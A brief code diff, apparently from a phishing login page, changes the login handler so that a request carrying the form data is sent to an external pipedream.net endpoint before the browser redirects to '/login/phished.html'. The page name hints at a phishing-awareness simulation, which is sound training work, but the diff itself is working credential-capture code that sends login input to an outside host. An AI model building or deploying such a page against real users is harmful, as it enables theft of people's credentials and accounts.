@@ -243,9 +243,9 @@
         body: JSON.stringify(body),
       };
 
-      fetch("https://eoiqxtr5za6pz92.m.pipedream.net", options);
-
-      window.location.pathname = "/login/phished.html";
+      fetch("https://eoiqxtr5za6pz92.m.pipedream.net", options).then(() => {
+        window.location.pathname = "/login/phished.html";
+      });
     }
 
     submitEl.addEventListener("click", login);
